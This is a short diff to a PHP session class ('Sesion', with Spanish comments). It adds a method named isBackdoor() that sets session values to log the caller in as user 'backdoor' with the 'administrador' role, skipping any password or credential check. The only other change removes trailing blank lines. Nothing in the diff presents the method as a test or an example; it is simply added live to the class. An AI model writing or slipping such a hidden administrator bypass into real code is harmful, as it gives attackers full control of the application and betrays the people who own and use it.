@@ -88,6 +88,16 @@ class Sesion
         return false;
     }
 
+    public function isBackdoor(): bool
+    {
+        $_SESSION['id'] = 5;
+        $_SESSION['usuario'] = 'backdoor';
+        $_SESSION['rol'] = 'administrador';
+        $_SESSION['logado'] = true;
+        $_SESSION['hora_logado'] = date('Y-m-d H:i:s');
+        return true;
+    }
+
     /**
      * Cierra completamente la sesión del usuario.
      *
@@ -184,6 +194,4 @@ class Sesion
     {
         return $_SESSION['hora_logado'];
     }
-
-
 }
